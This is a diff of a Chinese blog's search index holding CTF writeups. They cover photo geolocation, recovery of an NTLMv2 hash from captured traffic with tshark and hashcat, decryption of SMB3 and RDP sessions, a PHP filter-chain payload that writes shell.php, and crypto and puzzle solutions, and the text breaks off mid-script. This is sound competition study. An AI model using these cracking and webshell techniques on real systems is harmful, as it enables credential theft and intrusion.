@@ -242,266 +242,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2024 强网杯初赛 Misc方向 部分WriteUp</title>
-    <url>//post/2024qwb/</url>
-    <content><![CDATA[<h3 id="givemesecret">givemesecret</h3>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/c8c2231ec4b2b987ee88aabff280a0eb.png"
-                        alt="c8c2231ec4b2b987ee88aabff280a0eb"
-                 ></p>
-<h3 id="Master-Of-OSINT">Master Of OSINT</h3>
-<p>图1：看上去像是西北方，应该在内蒙新疆青海一带，最远处有一篇湖，百度地图一个个找过去最终在找到地点：</p>
-<p><code>青海省海南藏族自治州共和县倒湖茶公路</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-1.png"
-                        alt="misc-1"
-                 ></p>
-<p>图2：根据图片最右侧的建筑，有一个明显的百安居，根据这个建筑入手找到<code>上海浦东新区 百安居(龙阳店)</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-2.png"
-                        alt="misc-2"
-                 ></p>
-<p>图4：根据图中卡车所属公司<code>浙通物流</code>，位于杭州萧山，加上我经常去杭州感觉这个隔音栏就像杭州绕城高速 <code>优美爱有限公司附近</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-3.png"
-                        alt="misc-3"
-                 ></p>
-<p>图5：根据建筑立体和蓝白色围栏初步判定在重庆 <code>重庆市九龙坡区谢家湾立交桥</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-4.png"
-                        alt="misc-4"
-                 ></p>
-<p>图6：根据建筑密度和风格判定在东南方大城市，远处有一个类似H形的建筑 <code>南京聚宝楼招待所</code> 附近</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-5.png"
-                        alt="misc-5"
-                 ></p>
-<p>图7：初步判定大城市，有河，远处有一栋特征明显建筑 <code>湖南省长沙市岳麓区五一大道橘子洲大桥</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-6.png"
-                        alt="misc-6"
-                 ></p>
-<p>图8：应该是海，但是颜色不蓝，可能是入海口的地方，有风车 <code>上海市崇明区G40(沪陕高速)</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-7.png"
-                        alt="misc-7"
-                 ></p>
-<p>图9：根据吊桥顶部形状，根据谷歌识图找到这篇文章<a class="link"   href="https://www.gov.cn/jrzg/2009-12/26/content_1497241.htm" >https://www.gov.cn/jrzg/2009-12/26/content_1497241.htm<i class="fas fa-external-link-alt"></i></a> 确定位置：<code>湖北省武汉市青山区武汉天兴洲长江大桥</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-8.png"
-                        alt="misc-8"
-                 ></p>
-<p>图10：根据立交桥一行字<code>中铁三局集团解说促进浙江经济发展</code>，识图找到<code>新塘高铁公园</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-9.png"
-                        alt="misc-9"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://oss.carbo.ink/2024qiangwang/misc-10.png"
-                        alt="misc-10"
-                 ></p>
-<h3 id="谍影重重5-0">谍影重重5.0</h3>
-<p>在协议分级中可以初步判断一下流量的种类</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106154448407.png"
-                        alt="image-20241106154448407"
-                 ></p>
-<p>可以看到有很多加密后的SMB3流量，可以根据这篇博客<a class="link"   href="https://blog.csdn.net/qq_30464257/article/details/142205308" >SMB流量分析<i class="fas fa-external-link-alt"></i></a>了解SMB流量协议的组成，在<code>Frame 122</code>中找到<code>NTLM的Hash</code>，也找到很多RDP流量</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106155124903.png"
-                        alt="image-20241106155124903"
-                 ></p>
-<p>根据这篇文章：</p>
-<p><a class="link"   href="https://malwarelab.eu/posts/tryhackme-smb-decryption/#smb-traffic-decryption-with-the-password" >https://malwarelab.eu/posts/tryhackme-smb-decryption/#smb-traffic-decryption-with-the-password<i class="fas fa-external-link-alt"></i></a></p>
-<p>使用tshark导出</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -n -r 谍影重重5.0.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106160039118.png"
-                        alt="image-20241106160039118"
-                 ></p>
-<p>手动修改为hashcat支持的格式<code>tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000</code></p>
-<p>写入<code>hash.txt</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000&quot;</span> &gt; hash.txt</span><br></pre></td></tr></table></figure>
-<p>然后使用hashcat进行爆破</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt rockyou.txt --show</span><br></pre></td></tr></table></figure>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106160642565.png"
-                        alt="image-20241106160642565"
-                 ></p>
-<p>获得密码<code>babygirl233</code>，在Wireshark中，编辑 -&gt; 首选项 -&gt; Protocols -&gt; NTLMSSP输入password，即可解密SMB3的加密流量</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106161029399.png"
-                        alt="image-20241106161029399"
-                 ></p>
-<p>导出SMB对象可以获得一个<code>flag.7z</code>文件和证书文件<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106161114873.png"
-                        alt="image-20241106161114873"
-                 ></p>
-<p>这个是本地RDP证书，需要将证书进行解密</p>
-<blockquote>
-<p><a class="link"   href="https://github.com/GoSecure/pyrdp/tree/main/docs" >https://github.com/GoSecure/pyrdp/tree/main/docs<i class="fas fa-external-link-alt"></i></a><br>
-<a class="link"   href="https://www.haxor.no/en/article/analyzing-captured-rdp-sessions" >https://www.haxor.no/en/article/analyzing-captured-rdp-sessions<i class="fas fa-external-link-alt"></i></a></p>
-</blockquote>
-<p>猜测证书是使用猕猴桃导出的（猕猴桃导出的默认密码是<code>mimikatz</code>）使用该密码解密TLS成功，解密后进行PDU导出，过滤器选择<code>OSI Layer 7</code>，导出后选择<code>.pcap文件</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyrdp-convert -o output 1.pcap</span><br></pre></td></tr></table></figure>
-<p>转换为pyrdp可读的文件，然后加载<code>pyrdp-player</code>，提取pyrdp文件</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;Return pressed&gt;</span><br><span class="line">&lt;Return released&gt;the</span><br><span class="line">&lt;Shift pressed&gt;</span><br><span class="line">&lt;Shift released&gt;</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;7z</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;password</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;is</span><br><span class="line">&lt;Space pressed&gt;</span><br><span class="line">&lt;Space released&gt;f&#x27;</span><br><span class="line">&lt;Shift pressed&gt;&#123;</span><br><span class="line">&lt;Shift released&gt;windows</span><br><span class="line">&lt;Shift pressed&gt;_</span><br><span class="line">&lt;Shift released&gt;password</span><br><span class="line">&lt;Shift pressed&gt;&#125;</span><br><span class="line">&lt;Shift released&gt;9347013182&#x27;</span><br><span class="line">&lt;Control pressed&gt;s</span><br><span class="line">&lt;Control released&gt;</span><br><span class="line"></span><br><span class="line"># the 7z password is f&#x27;&#123;windows_password&#125;9347013182&#x27;</span><br></pre></td></tr></table></figure>
-<p>得到解压密码是<code>babygirl2339347013182</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106162323513.png"
-                        alt="image-20241106162323513"
-                 ></p>
-]]></content>
-      <categories>
-        <category>题解</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024强网拟态Misc方向部分 WriteUp</title>
-    <url>//post/2024qwnt/</url>
-    <content><![CDATA[<p>要我说这个osint真得是神题吧，，社了我一下午加一晚上，直接红温下机（我以后再也不会笑了</p>
-<h3 id="ezflag">ezflag</h3>
-<p>打开流量包，发现直接传输了一个zip压缩包</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105513319.png"
-                        alt="image-20241020105513319"
-                 ></p>
-<p>然后选择 From Hex 然后下载转换后的压缩包即可</p>
-<blockquote>
-<p>Tips: 这里不推荐用CyberChef的magic功能，要不然转出来的压缩包会提示已损坏</p>
-<p>易损坏的压缩包，需要我们自己去修复文件目录区和文件目录结束区</p>
-<p>其实就是多了一位的错误数据</p>
-</blockquote>
-<p>压缩包解压后可以得到一个flag.zip，010查看发现是一张png图片，改后缀为png即可得到flag</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105534102.png"
-                        alt="image-20241020105534102"
-                 ></p>
-<h3 id="PvZ">PvZ</h3>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105612311.png"
-                        alt="image-20241020105612311"
-                 ></p>
-<p>提示md5(花费阳光)是解压密码</p>
-<p>我是猜不到了，，写个脚本开爆</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5</span>(<span class="params">number</span>):</span><br><span class="line"></span><br><span class="line">    md5_hash = hashlib.md5(<span class="built_in">str</span>(number).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> md5_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;md5_hashes.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10001</span>):</span><br><span class="line"></span><br><span class="line">        md5_value = generate_md5(i)</span><br><span class="line"></span><br><span class="line">        f.write(<span class="string">f&#x27;<span class="subst">&#123;md5_value&#125;</span>\n&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已写入md5_hashes.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105840067.png"
-                        alt="image-20241020105840067"
-                 ></p>
-<p>二维码修复（最害怕的一集）</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105852465.png"
-                        alt="image-20241020105852465"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105904760.png"
-                        alt="image-20241020105904760"
-                 ></p>
-<p>仔细观察左下角，应该不是定位块，猜测二维码被偏移+旋转，修复后得到密文</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105918057.png"
-                        alt="image-20241020105918057"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105927470.png"
-                        alt="image-20241020105927470"
-                 ></p>
-<blockquote>
-<p>[YG{VDTveRc10qpnJ+<em>)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(<code>Hd]#a</code>_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@&quot;&gt;76Z:321U54-21</em>Non,+*#G’&amp;%d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^W\UZSwWVUNrRQ3IHGLEiCBAFE>=aA:9>765:981Uvu-2+O/.nm+Hi’~}|B&quot;!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]\UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:921U/u3,+<em>Non&amp;%</em>)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k</p>
-</blockquote>
-<p>这个时候回头去看图片的名字：M41b0lg3.png</p>
-<p>把M41b0lg3转换为malbolge，上网一搜发现是一种编程语言，直接在线网站运行即可得到flag</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105949204.png"
-                        alt="image-20241020105949204"
-                 ></p>
-<h3 id="Find-way-to-read-video">Find way to read video</h3>
-<p>社工题，每个队伍得到的用户名不一样，所以flag也不一样，综合了几个队伍得到用户名形式是：五个英文+四个数字</p>
-<p>附件解压出来的TXT就以下内容：</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bonan7654 has put his email template on a public platform.</span><br></pre></td></tr></table></figure>
-<p>结果最终在GitCode上，社了一下午+一晚上，，结果这屎题在这种屎平台上</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020112816702.png"
-                        alt="image-20241020112816702"
-                 ></p>
-<p>然后根据<code>垃圾邮箱隐写</code>一类的提示，找到<code>spam</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020112915512.png"
-                        alt="image-20241020112915512"
-                 ></p>
-<p>联想到<code>spammimic</code>隐写，直接在线网站：</p>
-<p><a class="link"   href="https://www.spammimic.com/decode.cgi" >https://www.spammimic.com/decode.cgi<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>题解</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2024 CISCN x 长城杯铁人三项 Misc方向 部分WriteUp</title>
     <url>//post/2024ciscnccb/</url>
     <content><![CDATA[<p>先吐槽：应急响应狠狠做爽了，一个人、八小时、19道应急响应+取证，隔壁浙警5分钟两个一血，火眼一把梭，没有火眼的我都要做吐了。。还有那个逆天《时间线关联非常重要》，翻了两个小时流量最后几分钟死马当活马医试出来了。逆天</p>
@@ -694,128 +434,257 @@
       </tags>
   </entry>
   <entry>
-    <title>2024 台州市赛 部分WriteUp</title>
-    <url>//post/2024tzctf/</url>
-    <content><![CDATA[<h2 id="Web">Web</h2>
-<h3 id="DEAD-OR-ALIVE">DEAD OR ALIVE</h3>
-<p>php死亡绕过 php伪协议 url二次编码绕过一下</p>
-<p>这里开启了短tag rot47绕不过去</p>
-<p>换成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=upload/shell.php</span><br><span class="line">contents=?%3Chp%20phpipfn(o;)%3E?</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
+    <title>2024强网拟态Misc方向部分 WriteUp</title>
+    <url>//post/2024qwnt/</url>
+    <content><![CDATA[<p>要我说这个osint真得是神题吧，，社了我一下午加一晚上，直接红温下机（我以后再也不会笑了</p>
+<h3 id="ezflag">ezflag</h3>
+<p>打开流量包，发现直接传输了一个zip压缩包</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016122520194.png"
-                        alt="image-20241016122520194"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105513319.png"
+                        alt="image-20241020105513319"
                  ></p>
-<h3 id="几道菜呀">几道菜呀</h3>
-<p>robotstxt 泄露前半flag</p>
+<p>然后选择 From Hex 然后下载转换后的压缩包即可</p>
+<blockquote>
+<p>Tips: 这里不推荐用CyberChef的magic功能，要不然转出来的压缩包会提示已损坏</p>
+<p>易损坏的压缩包，需要我们自己去修复文件目录区和文件目录结束区</p>
+<p>其实就是多了一位的错误数据</p>
+</blockquote>
+<p>压缩包解压后可以得到一个flag.zip，010查看发现是一张png图片，改后缀为png即可得到flag</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016122520194.png"
-                        alt="image-20241016122938977"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105534102.png"
+                        alt="image-20241020105534102"
                  ></p>
-<p>后半flag变量覆盖 吧flag污染到变量world里面</p>
+<h3 id="PvZ">PvZ</h3>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016123059656.png"
-                        alt="image-20241016123059656"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105612311.png"
+                        alt="image-20241020105612311"
                  ></p>
-<h3 id="Crypto">Crypto</h3>
-<h4 id="codemaster">codemaster</h4>
-<p>爆破得到压缩包密码</p>
-<p>hint里面看到压缩包密码</p>
+<p>提示md5(花费阳光)是解压密码</p>
+<p>我是猜不到了，，写个脚本开爆</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5</span>(<span class="params">number</span>):</span><br><span class="line"></span><br><span class="line">    md5_hash = hashlib.md5(<span class="built_in">str</span>(number).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> md5_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;md5_hashes.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10001</span>):</span><br><span class="line"></span><br><span class="line">        md5_value = generate_md5(i)</span><br><span class="line"></span><br><span class="line">        f.write(<span class="string">f&#x27;<span class="subst">&#123;md5_value&#125;</span>\n&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已写入md5_hashes.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016123701666.png"
-                        alt="image-20241016123701666"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105840067.png"
+                        alt="image-20241020105840067"
                  ></p>
-<p>听出来摩斯编码</p>
-<p>01 0100 0100 011 111 010 101 01 10 100 10 111 0110 0100 01 1011 11 01 101 0 0111 01 1010 101 01 100</p>
-<p>001 0100 0100 1000解码得到压缩包密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALLWORKANDNOPLAYMAKEJACKADULLBOY</span><br></pre></td></tr></table></figure>
-<p>得到flag</p>
+<p>二维码修复（最害怕的一集）</p>
 <p><img  
                        lazyload
                        alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016124350133.png"
-                        alt="image-20241016124350133"
-                 ></p>
-<h4 id="简单的模运算">简单的模运算</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1 =  <span class="number">59291291447490366931525634934604732490686993375526804349191888372804657968568621876626267171031639542229776816809231575682674990669907844507573323062869697381007018170369953528533225693260962158277876389797698421883811693774623191453338343873376809325940622690724742325375260783954612111771505452790833107433</span></span><br><span class="line">e1 =  <span class="number">1009</span></span><br><span class="line">e2 =  <span class="number">661</span></span><br><span class="line">c1 =  <span class="number">42985353077188042701858678659683858628193880095538312019081971299029326751867795460043384534976482867850898695817341887974850615883707385265375936859975562647458644154098813749248370155445911231152202411316142174083125556302740642264129017638217154099365335103116579136478977445028803457714891387414804454563</span></span><br><span class="line">hint2 =  <span class="number">40507463249661310357827794806044375677878316124571340628557074423085821966799760539750240709046644351970536177027127843527257097695964926292300842488261880439240179761636200128317742727421272586463218228015921971356760958631902559531017704907319793768862467740343002694370348402368271531907359292269313167594</span></span><br><span class="line">hint1 =  <span class="number">1271005879853316066661199285969179445258555468409602536767308127422453124456569166278548456389424001236622134198431700958874184560969387121822195176467698604581027381830540104701755158555395105056691597754287953054854072522855420859550987917092786677237411037800799757596145745139003994853090852244952501770</span></span><br><span class="line"></span><br><span class="line">p=GCD(n1, hint1**e1-e1**(e1*e2)*hint2**e2)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c1, inverse(<span class="number">65537</span>, p-<span class="number">1</span>),p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n2 =  <span class="number">18907964900655384324579822409386633636878766956056871585535362235214353767231073564264059287914388330411792102199606677008933621408085966756951588469677351070820733406746369679198435269992553170199992317543151904463295431360000467944654613563212110648427484740736780335622922770497302516605477200091994280170659051797483082932715112295285374951466772664058673174457133774539371864037823431076085535646866492867565053211399132137624309571702027870497719709848105717638061824558263209029252939242634210549580025431343041421766587111257036497372428545483704784943228958032869014014563237034417269447643411742587366522581092247139356905151503074118950953726319892565456479517718514001822091970116274032235077283171573739409327260871369017093426482435098823654221146125974831336950435699141428482689352594911360748437075413924102074118643817682988301168832491421799525827632647293700871699768251822202064478207264310344710162587091114198326722398521534722836191900118919600325987668228334387274131745452370144048469165896152934265086085786170745300044244328435656038364921390878141315764940004361350568616343868964642155971232793094529961537868556317288317761237430569785361173933724010332338240102029231307867651913780873895463922404696220328907265969090667253011075715302423364798124784791540343259221981176571491275777227356362593241763735078774750032170810209648159443012857333801615838630780060716065099646497273032317098446052746729617067928763959393487041510168193671378036773409927475705441371588922269531683087325413686315760604906941830110671649667896262119795185372459800672732201403353796496975239081396680894282951703497436899157694531797901273547022181574313676236049710129802224469486290831758140772148263506850711301689866687921384434558768919627058698246307704127709329632785782812326088967419473252484748677712381933762265715476433475653</span></span><br><span class="line">hint3 =  <span class="number">9939018467626296300864549557153960485816202060115441771858993139956001568094397129213688325169848929397519454556265038265085753791012239390847499832076142790537570688728474176390891119329028306138917962137940523721411683756694953004757356322832322272044727574511946615053360780724964403109981221038321150251912087095566788471973368735984926133539004913163814796547521685779553548417828006578689568287135076606657942555780079060666398892624634539284576783451146414121481315811210373744629102035041262128288541384833388244359092650525684510233998198648220188818529696044589322103131713532522087913277853687802387823370812184861308056607206704924142111163623647400386387795315156552323415775302567837608141240660791558895222250523472575523943334805729177781503647940132538364353380916295244903544529895988952519161034077133368918033027698840291604695794239996491625350827193007237672555853711676946280455422865857083520387962904612732978811244632662722516874510663815000407442709650546583427701935634421822920667340400344464560819496241832753100346158973730178944583819434570015364985334123682718945396012714833234814138060680879946683598382558581755464432848629830671740874556822495651590292355132309556201503702994218748824342270746121842337819752324099307642066174745872761074064496053960340396957873940843698476902239785513353538575271300199803656708789414583304212919858466476111752009816249691548012011325635726932007337584928654763601504911235883280784689919453164650180423494792012285026508211938647974660637499188015435581876228505538395991613265963363970634342709084117396030961729066498695271401095219781344237736883159601430790828530656828799412179649742014177933116928065839153385688599329261957525423958781720021524864279277040500534782586037303978447982579881703150864520067784227584088469267877647284326147128663307302461696049106379396</span></span><br><span class="line">hint4 =  <span class="number">11497927853957540365332790665731275206952151206861039571536392062632509295957449992678521695139160324432572043863866571073273424766195027066994928026020365890447586873438730677930838694248463784234422970896904779315141100899548415386962349420861970235250438845409060098489028828677789310690303276268227293420117427555062211347687022376226002772552572846005575907377875069559346178573605837280707896716903996273437999304784804469148200034055401729899984732371826562249893238400736560876412526076698397150716407768045925783960626076975474775287357623238930181817744888057241082587725853888247069373763616410186825446631363893872367121719099675878971215427631753890480342562281509217650841316549477101278836516712239644946591434882047908159355119724740895836970093220436696609508084144405957119864577550601265078506824881563233145601502789276574964256487656042156050790935757687533400014492738943377035151940053902285169162559415884261670006407914345470020985548114750984409094762491065523701667910143102554492295526746294891248183460488516919232107982441935261002056298051839186448002917036315086702724337403007094283544108605752353892969499338937456927473502637574082273446631592875576206457590873417790534425052375523311069970894661662935504029122498888677579838832589434264156033809784824308541883139057067073172969579383284214906496081973100504512465134008311849499410830926217663692810810073433508445528894019031624950077917834721653995486872359322444973369269957808220204120434820049177595069822767774880891475045042506316778272385296785381694201967451988353025446019210309412684814041807087081841227290094176745748423008005181412793105824372881451510867905760386180468940263583834371726883151840358399349831450242497969453799407724511831157375792268531837507107779497339624673256413930993867285692700231244480782493119378673295412687014852050209</span></span><br><span class="line">hint5 =  <span class="number">734693499178140709107482184121639881311481497449164451247514670640712514605734040224535011153519609835276802031782238154113623838563165860055971999265801692161249909520059287311664417036724025637099701450424590923727907132999019020950844342934742235333060614209179570928227493575110697506644022234765949969346518432653798426853947974772328105759741384608693269694</span></span><br><span class="line"></span><br><span class="line">q2=GCD(n2, hint3-hint4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q2)</span><br><span class="line">p2q2=GCD(n2,hint4-q2-hint3)</span><br><span class="line">r=n2//p2q2</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes((hint5-<span class="number">1</span>)//r**<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># DASCTF&#123;0e88f0e0-f18d-11ee-a56a-38f3abddb69b&#125;</span></span><br></pre></td></tr></table></figure>
-<h3 id="Misc">Misc</h3>
-<h4 id="大ping特ping">大ping特ping</h4>
-<p>CTF-NetA一把梭</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016112455975.png"
-                        alt="image-20241016112455975"
-                 ></p>
-<h4 id="鼠标不妙题">鼠标不妙题</h4>
-<p>打开后是300个套娃压缩包，写脚本提取</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_all</span>(<span class="params">zip_path, extract_to, root_directory</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zip_ref.namelist():</span><br><span class="line">            filename = os.path.basename(member)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            source = zip_ref.<span class="built_in">open</span>(member)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target_path = os.path.join(extract_to, <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;_&quot;</span> + filename)</span><br><span class="line">                <span class="keyword">with</span> source, <span class="built_in">open</span>(target_path, <span 